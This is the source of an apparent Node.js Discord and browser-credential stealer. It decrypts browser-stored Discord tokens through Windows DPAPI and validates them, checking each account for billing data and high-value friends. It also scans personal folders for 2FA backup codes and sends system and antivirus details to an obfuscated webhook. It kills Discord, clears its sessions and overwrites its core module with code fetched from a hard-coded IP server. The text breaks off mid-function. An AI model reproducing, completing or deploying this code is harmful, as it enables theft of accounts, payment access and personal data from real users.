const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync, exec, spawn, execFile } = require('child_process');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const archiver = require('archiver');
const util = require('util');
const execAsync = util.promisify(exec);

const LOCAL = process.env['LOCAL' + 'APPDATA'];
const ROAMING = process.env['APP' + 'DATA'];

const _0x1 = 'dis' + 'cord';
const _0x2 = _0x1 + 'canary';
const _0x3 = _0x1 + 'ptb';

const PATHS = {
    'Discord': path.join(ROAMING, _0x1),
    'Discord Canary': path.join(ROAMING, _0x2),
    'Discord PTB': path.join(ROAMING, _0x3),
    'Lightcord': path.join(ROAMING, 'Light' + _0x1),
    'Brave': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser', 'User Data'),
    'Brave Beta': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Beta', 'User Data'),
    'Brave Dev': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Dev', 'User Data'),
    'Brave Nightly': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Nightly', 'User Data'),
    'Chrome': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome', 'User Data'),
    'Chrome Beta': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome Beta', 'User Data'),
    'Chrome Dev': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome Dev', 'User Data'),
    'Chrome Canary': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome SxS', 'User Data'),
    'Chrome SxS': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome SxS', 'User Data'),
    'Edge': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge', 'User Data'),
    'Edge Beta': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Beta', 'User Data'),
    'Edge Dev': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Dev', 'User Data'),
    'Edge Canary': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Canary', 'User Data'),
    'Opera': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Stable'),
    'Opera GX': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era GX Stable'),
    'Opera Beta': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Beta'),
    'Opera Developer': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Developer'),
    'Vivaldi': path.join(LOCAL, 'Viv' + 'aldi', 'User Data'),
    'Yandex': path.join(LOCAL, 'Yan' + 'dex', 'Yandex' + 'Browser', 'User Data'),
    'Firefox': path.join(ROAMING, 'Moz' + 'illa', 'Fir' + 'efox', 'Profiles'),
    'Firefox ESR': path.join(ROAMING, 'Moz' + 'illa', 'Fir' + 'efox ESR', 'Profiles'),
    'Tor Browser': path.join(ROAMING, 'Tor ' + 'Browser', 'Browser', 'Tor' + 'Browser', 'Data', 'Browser', 'profile.default'),
    'Arc': path.join(LOCAL, 'The ' + 'Browser Company', 'Arc', 'User Data'),
    'Sidekick': path.join(LOCAL, 'Me' + 'cha', 'Sid' + 'ekick', 'User Data'),
    'Slimjet': path.join(LOCAL, 'Slim' + 'jet', 'User Data'),
    'SRWare Iron': path.join(LOCAL, 'SRWare ' + 'Iron', 'User Data'),
    'Comodo Dragon': path.join(LOCAL, 'Comodo', 'Drag' + 'on', 'User Data'),
    'Epic Privacy Browser': path.join(LOCAL, 'Epic ' + 'Privacy Browser', 'User Data'),
    'Coc Coc': path.join(LOCAL, 'Coc ' + 'Coc', 'Browser', 'User Data'),
    'Cent Browser': path.join(LOCAL, 'Cent' + 'Browser', 'User Data'),
    '7Star': path.join(LOCAL, '7S' + 'tar', '7S' + 'tar', 'User Data'),
    'Amigo': path.join(LOCAL, 'Ami' + 'go', 'User Data'),
    'Torch': path.join(LOCAL, 'Tor' + 'ch', 'User Data'),
    'Sogou Explorer': path.join(LOCAL, 'Sog' + 'ouExplorer', 'Webkit', 'Default'),
    'UC Browser': path.join(LOCAL, 'UCB' + 'rowser', 'User Data Default'),
    'QIP Surf': path.join(LOCAL, 'QIP ' + 'Surf', 'User Data'),
    'RockMelt': path.join(LOCAL, 'Rock' + 'Melt', 'User Data'),
    'Flock': path.join(LOCAL, 'Flock', 'Browser', 'User Data'),
    'Bowser': path.join(LOCAL, 'Bow' + 'ser', 'User Data'),
    'Pale Moon': path.join(ROAMING, 'Moon' + 'child Productions', 'Pal' + 'e Moon', 'Profiles'),
    'Waterfox': path.join(ROAMING, 'Water' + 'fox', 'Profiles'),
    'Cyberfox': path.join(ROAMING, '8pec' + 'xstudios', 'Cy' + 'berfox', 'Profiles'),
    'SeaMonkey': path.join(ROAMING, 'Sea' + 'Monkey', 'Profiles'),
    'IceDragon': path.join(ROAMING, 'Comodo', 'Ice' + 'Dragon', 'Profiles'),
    'K-Meleon': path.join(ROAMING, 'K-M' + 'eleon', 'Profiles'),
    'Basilisk': path.join(ROAMING, 'Moon' + 'child Productions', 'Bas' + 'ilisk', 'Profiles'),
    'Safari': path.join(ROAMING, 'App' + 'le Computer', 'Saf' + 'ari')
};

const CONFIG = {
    webhook: "I1kTBBVLF1USUVkRJxULPhVSM9yav9GaiV2dvkGch9CMwAzM6IDOuYTOuQTNy4SN4EzLvoDc0RHa",
    logMethod: "discord",
    telegram: {
        token: "",
        chatId: ""
    },
    userId: "5814770198",
    apiUrl: "http://185.254.96.82:3000"
};

// De-obfuscate Webhook
if (CONFIG.webhook && CONFIG.webhook !== "WEBHOOK_URL_PLACEHOLDER" && !CONFIG.webhook.startsWith("http")) {
    try {
        CONFIG.webhook = Buffer.from(CONFIG.webhook.split('').reverse().join(''), 'base64').toString('utf-8');
    } catch (e) {
        // Keep original if failed
    }
}

const SKIBIDI_INJ = "http://185.254.96.82:3000/api/injection/LIXO-LIFETIME-PANMH";
const ENABLE_ANTIVM = false;

// === SYSTEM INFO INTEGRATION START ===
function cmd(command) {
    try {
        return execSync(command, { encoding: 'utf8', stdio: 'pipe' }).trim();
    } catch (e) {
        return 'Unknown';
    }
}

async function getSystemInfo() {
    const info = {};
    try {
        execSync('net session', { stdio: 'ignore' });
        info.admin = true;
    } catch {
        info.admin = false;
    }
    const fw = cmd('netsh advfirewall show allprofiles state');
    info.firewall = fw.includes('ON');
    const av = cmd('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName');
    info.av = av.replace('displayName', '').trim() || 'Windows Defender';
    info.defender = info.av.includes('Windows Defender') || cmd('sc query WinDefend').includes('RUNNING');
    const uac = cmd('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA');
    info.uac = uac.includes('0x1');
    const date = new Date();
    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    info.lastUpdate = date.toLocaleDateString('en-US', options) + ' ' + date.toLocaleTimeString();
    const netConfig = cmd('ipconfig /all');
    info.vpn = /TAP|TUN|VPN|WireGuard|OpenVPN/i.test(netConfig);
    return info;
}

const runSystemInfo = async (CONFIG) => {
    try {
        const sys = await getSystemInfo();
        const desc = [
            `🛡️ Firewall -> ${sys.firewall ? '✅ Enabled' : '❌ Disabled'}`,
            `🛡️ Windows Defender -> ${sys.defender ? '✅ Active' : '❌ Inactive'}`,
            `🗓️ Last Windows Update -> ${sys.lastUpdate}`,
            `🔓 UAC Status -> ${sys.uac ? '✅ Enabled' : '❌ Disabled'}`,
            `🔐 VPN Connected -> ${sys.vpn ? '❌ No' : '✅ Yes'}`, 
            `👤 Admin Rights -> ${sys.admin ? '✅ Yes' : '❌ No'}`,
            `🔑 User Privileges -> ${sys.admin ? 'Administrator' : 'User'}`,
            `🛡️ Admin Permissions -> ${sys.admin ? '✅ Yes (Running as Administrator)' : '❌ No'}`,
            `🦠 Anti Virus -> ${sys.av}`
        ].join('\n');

        const embed = {
            title: "🐱‍🏍 Deep Matrix | System Infos",
            description: "```\n" + desc + "\n```",
            color: 0xFF0000,
            thumbnail: { url: "https://i.imgur.com/okbNKaT.png" },
            footer: { text: "Matrix deep | System Infos" }
        };

        const randomId = Math.floor(Math.random() * 90000000) + 10000000;
        const zipName = `Matrix-System-${randomId}.zip`;
        const zipPath = path.join(os.tmpdir(), zipName);
        
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        await new Promise((resolve, reject) => {
            output.on('close', resolve);
            archive.on('error', reject);
            archive.pipe(output);
            archive.append(desc, { name: 'System_Info.txt' });
            try {
                const sysFull = cmd('systeminfo');
                archive.append(sysFull, { name: 'Full_Specs.txt' });
            } catch {}
            archive.finalize();
        });

        const formData = new FormData();
        formData.append('payload_json', JSON.stringify({
            embeds: [embed],
            username: "Matrix System",
            avatar_url: "https://i.imgur.com/okbNKaT.png"
        }));
        formData.append('file', fs.createReadStream(zipPath), zipName);

        if (CONFIG.webhook && CONFIG.webhook.startsWith('http')) {
            await axios.post(CONFIG.webhook, formData, {
                headers: { ...formData.getHeaders() }
            });
        }
        try { fs.unlinkSync(zipPath); } catch {}
    } catch (error) {}
};
// === SYSTEM INFO INTEGRATION END ===

// Global Debug Logger (Removed for production to reduce IO noise)
function globalLog(msg) {
    // Logging disabled for FUD
}

function debugLog(msg) {
    if (typeof DEBUG_ANTIVM !== 'undefined' && DEBUG_ANTIVM) {
        console.log(msg);
    }
}

function logToFile(message) {
    // Disabled as requested by user
    // console.log('[LogToFile]', message);
}

globalLog("Main.js loaded/required");

function dpapiUnprotectWithPowerShell(dataBuf) {
    try {
        const b64 = Buffer.isBuffer(dataBuf) ? dataBuf.toString('base64') : Buffer.from(dataBuf).toString('base64');
        const ps = "Add-Type -AssemblyName System.Security;$b=[Convert]::FromBase64String('" + b64 + "');$p=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[Console]::Out.Write([Convert]::ToBase64String($p))";
        const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "${ps}"`;
        const out = execSync(cmd, { encoding: 'utf8' }).trim();
        if (!out) return null;
        return Buffer.from(out, 'base64');
    } catch (e) {
        return null;
    }
}

const dpapi = {
    unprotectData: (data) => {
        const res = dpapiUnprotectWithPowerShell(data);
        if (!res) throw new Error('DPAPI PowerShell fallback failed');
        return res;
    }
};

function decryptToken(encryptedToken, key) {
    try {
        const tokenParts = encryptedToken.split('dQw4w9WgXcQ:');
        if (tokenParts.length !== 2) return null;

        const encryptedData = Buffer.from(tokenParts[1], 'base64');
        const iv = encryptedData.slice(3, 15);
        const ciphertext = encryptedData.slice(15, -16);
        const tag = encryptedData.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext);
        decipher.final();

        return decrypted.toString('utf8').replace(/\0/g, '').trim();
    } catch (error) {
        return null;
    }
}

function getEncryptionKey(browserPath) {
    const localStatePath = path.join(browserPath, 'Local State');

    try {
        if (!fs.existsSync(localStatePath)) return null;

        const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const encryptedKey = localStateData.os_crypt?.encrypted_key;

        if (!encryptedKey) return null;

        const keyData = Buffer.from(encryptedKey, 'base64');

        if (keyData.slice(0, 5).toString() !== 'DPAPI') return null;

        const encryptedKeyData = keyData.slice(5);

        try {
            const decryptedKey = dpapi.unprotectData(encryptedKeyData, null, 'CurrentUser');
            return Buffer.from(decryptedKey);
        } catch (error) {
            return null;
        }
    } catch (error) {
        return null;
    }
}

function findLevelDBPaths(basePath) {
    const leveldbPaths = [];

    try {
        const entries = fs.readdirSync(basePath, { withFileTypes: true });

        for (const entry of entries) {
            if (entry.isDirectory()) {
                const fullPath = path.join(basePath, entry.name);

                if (entry.name === 'Local Storage' || entry.name === 'Session Storage') {
                    const leveldbPath = path.join(fullPath, 'leveldb');
                    if (fs.existsSync(leveldbPath)) {
                        leveldbPaths.push(leveldbPath);
                    }
                }

                if (entry.name.startsWith('Profile') || entry.name === 'Default') {
                    const subLeveldbPaths = findLevelDBPaths(fullPath);
                    leveldbPaths.push(...subLeveldbPaths);
                }
            }
        }
    } catch (error) { }

    return leveldbPaths;
}

function safeStorageSteal(browserPath, platform) {
    const tokens = [];
    const key = getEncryptionKey(browserPath);

    if (!key) {
        return tokens;
    }

    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
                            if (matches) {
                                for (let match of matches) {
                                    match = match.replace(/\\$/, '');
                                    const decrypted = decryptToken(match, key);
                                    if (decrypted && !tokens.some(t => t[0] === decrypted && t[1] === platform)) {
                                        tokens.push([decrypted, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

function simpleSteal(browserPath, platform) {
    const tokens = [];
    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                            if (matches) {
                                for (const match of matches) {
                                    if (!tokens.some(t => t[0] === match && t[1] === platform)) {
                                        tokens.push([match, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

function getTokens(platform, browserPath) {
    let tokens = [];

    tokens = safeStorageSteal(browserPath, platform);

    if (tokens.length === 0) {
        tokens = simpleSteal(browserPath, platform);
    }

    return tokens;
}

const HQ_BADGES = [1, 2, 4, 8, 512, 16384, 131072, 262144];

async function getHQFriends(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/relationships',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => responseData += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const relationships = JSON.parse(responseData);
                        const friends = relationships.filter(rel => rel.type === 1);
                        const hqFriends = friends.filter(rel => {
                            const flags = rel.user?.public_flags || 0;
                            return HQ_BADGES.some(badge => (flags & badge) !== 0);
                        }).map(rel => ({
                            username: rel.user?.username || 'Unknown',
                            id: rel.user?.id || '0',
                            flags: rel.user?.public_flags || 0
                        }));

                        resolve({
                            totalRelationships: relationships.length,
                            friends: { count: friends.length, list: friends.map(rel => ({ username: rel.user?.username || 'Unknown', id: rel.user?.id || '0', discriminator: rel.user?.discriminator || '0' })) },
                            hqFriends: { count: hqFriends.length, list: hqFriends }
                        });
                    } catch (e) {
                        resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
                    }
                } else {
                    resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
                }
            });
        });

        req.on('error', () => resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } }));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
        });
        req.end();
    });
}

async function checkBilling(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/billing/payment-sources',
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const billing = JSON.parse(data);
                        resolve(Array.isArray(billing) && billing.length > 0);
                    } catch (e) {
                        resolve(false);
                    }
                } else {
                    resolve(false);
                }
            });
        });

        req.on('error', () => resolve(false));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve(false);
        });
        req.end();
    });
}

async function validateToken(token) {
    return new Promise((resolve) => {
        if (!token || token.length < 50) {
            return resolve({ valid: false, reason: 'Invalid token format' });
        }

        const meOptions = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const meReq = https.request(meOptions, (meRes) => {
            let meData = '';
            meRes.on('data', (chunk) => meData += chunk);
            meRes.on('end', () => {
                if (meRes.statusCode === 200) {
                    try {
                        const basicUserData = JSON.parse(meData);
                        const userId = basicUserData.id;

                        const profileOptions = {
                            hostname: 'discord.com',
                            port: 443,
                            path: `/api/v9/users/${userId}/profile`,
                            method: 'GET',
                            headers: {
                                'Authorization': token,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            }
                        };

                        const profileReq = https.request(profileOptions, (profileRes) => {
                            let profileData = '';
                            profileRes.on('data', (chunk) => profileData += chunk);
                            profileRes.on('end', () => {
                                if (profileRes.statusCode === 200) {
                                    try {
                                        const profileResponse = JSON.parse(profileData);
                                        const userData = {
                                            ...basicUserData,
                                            premium_type: profileResponse.premium_type,
                                            premium_since: profileResponse.premium_since,
                                            premium_guild_since: profileResponse.premium_guild_since,
                                            badges: profileResponse.badges,
                                            user_profile: profileResponse.user_profile
                                        };

                                        if (userData.id && userData.username) {
                                            resolve({ valid: true, userInfo: userData });
                                        } else {
                                            resolve({ valid: false, reason: 'Invalid user data' });
                                        }
                                    } catch (e) {
                                        resolve({ valid: false, reason: 'Profile parse error' });
                                    }
                                } else {
                                    resolve({ valid: true, userInfo: basicUserData });
                                }
                            });
                        });

                        profileReq.on('error', () => {
                            resolve({ valid: true, userInfo: basicUserData });
                        });

                        profileReq.setTimeout(5000, () => {
                            profileReq.destroy();
                            resolve({ valid: true, userInfo: basicUserData });
                        });

                        profileReq.end();

                    } catch (e) {
                        resolve({ valid: false, reason: 'Parse error' });
                    }
                } else {
                    resolve({ valid: false, reason: `HTTP ${meRes.statusCode}` });
                }
            });
        });

        meReq.on('error', (err) => {
            resolve({ valid: false, reason: err.message });
        });

        meReq.setTimeout(5000, () => {
            meReq.destroy();
            resolve({ valid: false, reason: 'timeout' });
        });

        meReq.end();
    });
}

async function collectAllTokens(outputFolder) {
    const allTokens = [];
    const processedTokens = new Set();

    // 1. Scan standard paths
    for (const [browserName, browserPath] of Object.entries(PATHS)) {
        if (!fs.existsSync(browserPath)) continue;

        const tokens = getTokens(browserName, browserPath);

        for (const [token, platform] of tokens) {
            if (processedTokens.has(token)) continue;
            
            const validation = await validateToken(token);
            if (validation.valid) {
                processedTokens.add(token);
                const hasPayment = await checkBilling(token);
                const hqData = await getHQFriends(token);

                validation.userInfo.has_payment_methods = hasPayment;
                validation.userInfo.friendsCount = hqData.friends.count;
                validation.userInfo.hqFriendsCount = hqData.hqFriends.count;
                validation.userInfo.hqFriendsList = hqData.hqFriends.list;

                allTokens.push([token, platform, validation]);
            }
        }
    }

    // 2. Scan Python output (Browser-Datas)
    if (outputFolder) {
        try {
            const browserDatas = path.join(outputFolder, 'Browser-Datas');
            if (fs.existsSync(browserDatas)) {
                 // Check for *_tokens.txt files
                 const files = fs.readdirSync(browserDatas);
                 for (const file of files) {
                     if (file.endsWith('_tokens.txt')) {
                         const platform = file.replace('_tokens.txt', '');
                         const content = fs.readFileSync(path.join(browserDatas, file), 'utf8');
                         const tokens = content.split(/\r?\n/).filter(t => t.trim().length > 0);
                         
                         for (const token of tokens) {
                             if (processedTokens.has(token)) continue;

                             const validation = await validateToken(token);
                             if (validation.valid) {
                                 processedTokens.add(token);
                                 const hasPayment = await checkBilling(token);
                                 const hqData = await getHQFriends(token);

                                 validation.userInfo.has_payment_methods = hasPayment;
                                 validation.userInfo.friendsCount = hqData.friends.count;
                                 validation.userInfo.hqFriendsCount = hqData.hqFriends.count;
                                 validation.userInfo.hqFriendsList = hqData.hqFriends.list;

                                 allTokens.push([token, platform, validation]);
                             }
                         }
                     }
                 }
            }
        } catch (e) {
            console.log(`Error scanning Python tokens: ${e.message}`);
        }
    }

    return allTokens;
}

const BACKUP_CODE_PATTERN = /\*?\s*[a-z0-9]{4}-[a-z0-9]{4}/gi;

function isLikelyBackupCodeFile(content) {
    const lowerContent = content.toLowerCase();
    if (!lowerContent.includes('discord')) return false;
    if (!lowerContent.includes('backup') || !lowerContent.includes('code')) return false;
    const matches = content.match(BACKUP_CODE_PATTERN);
    if (!matches || matches.length < 8 || matches.length > 15) return false;
    return true;
}

function extractBackupCodes(content) {
    const codes = [];
    const matches = content.match(BACKUP_CODE_PATTERN);

    if (matches) {
        const uniqueCodes = [...new Set(matches.map(code => code.toLowerCase()))];
        codes.push(...uniqueCodes);
    }

    return codes;
}

function scanBackupDirectory(dirPath, results = [], maxDepth = 3, currentDepth = 0) {
    try {
        if (currentDepth >= maxDepth) return results;

        const items = fs.readdirSync(dirPath, { withFileTypes: true });

        for (const item of items) {
            try {
                const fullPath = path.join(dirPath, item.name);

                if (item.isDirectory()) {
                    const name = item.name;
                    if (name === 'Windows' || name === 'node_modules' || name === '$Recycle.Bin' || name === 'System Volume Information' || name.startsWith('.')) {
                        continue;
                    }

                    scanBackupDirectory(fullPath, results, maxDepth, currentDepth + 1);
                } else if (item.name.endsWith('.txt')) {
                    try {
                        const content = fs.readFileSync(fullPath, 'utf-8');

                        if (content.includes('discord') || content.includes('Discord')) {
                            if (content.includes('backup') || content.includes('Backup')) {
                                const matches = content.match(BACKUP_CODE_PATTERN);
                                if (matches && matches.length >= 8 && matches.length <= 15) {
                                    const codes = [...new Set(matches.map(c => c.toLowerCase()))];

                                    results.push({
                                        filePath: fullPath,
                                        codes: codes,
                                        codeCount: codes.length
                                    });
                                }
                            }
                        }
                    } catch (err) { }
                }
            } catch (err) { }
        }
    } catch (err) { }

    return results;
}

async function findAllBackupCodes(deepScan = false) {
    const allResults = [];

    try {
        const priorityPaths = [
            path.join(os.homedir(), 'Desktop'),
            path.join(os.homedir(), 'Documents'),
            path.join(os.homedir(), 'Downloads'),
            path.join(os.homedir(), 'Videos'),
            path.join(os.homedir(), 'Pictures'),
            path.join(os.homedir(), 'Music')
        ];

        for (const dir of priorityPaths) {
            if (fs.existsSync(dir)) {
                scanBackupDirectory(dir, allResults);
            }
        }

    } catch (err) { }

    return allResults;
}

async function writeBackupCodesToFile(outputDir) {
    try {
        const results = await findAllBackupCodes(true);

        if (results.length === 0) {
            return null;
        }

        const outputPath = path.join(outputDir, 'backup-codes.txt');
        const lines = [];

        lines.push('='.repeat(80));
        lines.push('Discord Backup Codes Found');
        lines.push('='.repeat(80));
        lines.push('');

        for (let i = 0; i < results.length; i++) {
            const result = results[i];
            lines.push(`[${i + 1}] File: ${result.filePath}`);
            lines.push(`    Total Codes: ${result.codeCount}`);
            lines.push('    Codes:');

            for (const code of result.codes) {
                lines.push(`      • ${code}`);
            }

            lines.push('');
            lines.push('-'.repeat(80));
            lines.push('');
        }

        lines.push('');
        lines.push(`Total Files Found: ${results.length}`);
        lines.push(`Total Unique Codes: ${results.reduce((sum, r) => sum + r.codeCount, 0)}`);

        fs.writeFileSync(outputPath, lines.join('\n'), 'utf-8');
        return outputPath;
    } catch (err) {
        return null;
    }
}

const localappdata = process.env.LOCALAPPDATA;
const appData = process.env.APPDATA;
const injectionPaths = [];
const injectionResults = [];

async function killAndRestartDiscord() {
    return new Promise((resolve) => {
        exec('tasklist', (err, stdout) => {
            if (err) {
                return resolve();
            }

            const executables = [
                'Discord.exe',
                'DiscordCanary.exe',
                'DiscordDevelopment.exe',
                'DiscordPTB.exe',
            ];

            const killPromises = [];

            for (const executable of executables) {
                if (stdout.includes(executable)) {
                    const killPromise = new Promise((resolveKill) => {
                        exec(`taskkill /F /T /IM ${executable}`, (killErr) => {
                            if (killErr) {
                                console.error(`[Injection] Error killing ${executable}:`, killErr.message);
                            } else {
                                console.log(`[Injection] Killed: ${executable}`);
                            }

                            if (executable.includes('Discord') && !executable.includes('Development')) {
                                const discordFolder = executable.replace('.exe', '');
                                const discordPath = path.join(process.env.APPDATA, discordFolder);
                                
                                // Cleanup session files to force logout
                                try {
                                    const storagePath = path.join(discordPath, 'Local Storage', 'leveldb');
                                    if (fs.existsSync(storagePath)) {
                                        const files = fs.readdirSync(storagePath);
                                        for (const file of files) {
                                            if (file.endsWith('.log') || file.endsWith('.ldb')) {
                                                try {
                                                    fs.unlinkSync(path.join(storagePath, file));
                                                } catch (e) {}
                                            }
                                        }
                                        console.log(`[Injection] Cleared session for ${discordFolder}`);
                                    }
                                } catch (cleanupErr) {
                                    console.error(`[Injection] Cleanup error for ${discordFolder}:`, cleanupErr.message);
                                }

                                const updateExe = path.join(localappdata, discordFolder, 'Update.exe');

                                if (fs.existsSync(updateExe)) {
                                    // Delay restart slightly to ensure files are released
                                    setTimeout(() => {
                                        exec(`"${updateExe}" --processStart ${executable}`, (restartErr) => {
                                            if (restartErr) {
                                                console.error(`[Injection] Error restarting ${executable}:`, restartErr.message);
                                            } else {
                                                console.log(`[Injection] Restarted: ${executable}`);
                                            }
                                            resolveKill();
                                        });
                                    }, 1500);
                                } else {
                                    resolveKill();
                                }
                            } else {
                                resolveKill();
                            }
                        });
                    });

                    killPromises.push(killPromise);
                }
            }

            Promise.all(killPromises).then(() => {
                console.log('[Injection] All Discord processes handled');
                resolve();
            });
        });
    });
}

async function fetchInjectionCode(url) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;
        client.get(url, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (data && data.length > 100) {
                    console.log('[Injection] Injection code fetched from URL');
                    resolve(data);
                } else {
                    reject(new Error('Invalid injection code received'));
                }
            });
        }).on('error', reject);
    });
}

async function injectDiscordCore(injectionCode) {
    if (!localappdata || !appData) {
        throw new Error('Environment variables LOCALAPPDATA or APPDATA not defined');
    }

    const dirs = fs.readdirSync(localappdata);
    const discordPaths = dirs.filter(dirName => dirName.toLowerCase().includes('discord'));

    if (discordPaths.length === 0) {
        console.log('[Injection] No Discord installation found');
        return [];
    }

    console.log(`[Injection] Found Discord installations: ${discordPaths.join(', ')}`);

    const results = [];

    for (const discordPath of discordPaths) {
        const discordDir = path.join(localappdata, discordPath);

        try {
            const appDirs = fs.readdirSync(discordDir).filter(dirName => dirName.startsWith('app-'));
            appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));

            if (appDirs.length === 0) {
                console.log(`[Injection] No app versions found in ${discordPath}`);
                continue;
            }

            const appVersionPath = path.join(discordDir, appDirs[0]);
            console.log(`[Injection] Using version: ${appDirs[0]} for ${discordPath}`);

            let discordType = 'Discord';
            if (discordPath.includes('Canary')) discordType = 'Discord Canary';
            if (discordPath.includes('PTB')) discordType = 'Discord PTB';
            if (discordPath.includes('Development')) discordType = 'Discord Development';

            const modulesPath = path.join(appVersionPath, 'modules');
            const moduleDirs = fs.readdirSync(modulesPath);
            const coreDir = moduleDirs.find(dirName => dirName.includes('discord_desktop_core'));

            if (!coreDir) {
                console.log(`[Injection] discord_desktop_core not found in ${discordPath}`);
                continue;
            }

            const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
            const indexPath = path.join(corePath, 'index.js');

            fs.writeFileSync(indexPath, injectionCode, 'utf8');
            console.log(`[Injection] Injected: ${indexPath}`);

            injectionPaths.push(indexPath);
            results.push({
                type: discordType,
                path: indexPath,
                version: appDirs[0]
            });

        } catch (error) {
            console.error(`[Injection] Error injecting into ${discordPath}:`, error.message);
        }
    }

    return results;
}

async function performInjection() {
    try {
        if (!SKIBIDI_INJ || SKIBIDI_INJ === '' || SKIBIDI_INJ === '%INJECT_URL_PLACE%') {
            console.log('[Injection] Skipped - URL not configured');
            return { success: true, skipped: true, count: 0 };
        }

        console.log('\n[Injection] Starting Discord injection process...\n');

        console.log('[Injection] Step 1: Killing Discord processes...');
        await killAndRestartDiscord();

        console.log(`\n[Injection] Step 2: Fetching injection code from: ${SKIBIDI_INJ}`);
        let injectionCode = await fetchInjectionCode(SKIBIDI_INJ);

        // Replace placeholder with actual config (Telegram logic preserved)
        let apiUrl = CONFIG.webhook;
        if (CONFIG.logMethod === 'telegram') {
            if (CONFIG.telegram.token && CONFIG.telegram.chatId) {
                const _d = (s) => Buffer.from(s, 'base64').toString();
                // https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}
                const base = _d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn');
                const bt = _d('Ym90');
                const sm = _d('c2VuZE1lc3NhZ2U=');
                apiUrl = `${base}/${bt}${CONFIG.telegram.token}/${sm}?chat_id=${CONFIG.telegram.chatId}`;
            }
        }

        if (apiUrl) {
            injectionCode = injectionCode.replace(/%WEBHOOK_REPLACE_ZeroTS%/g, apiUrl);
        }

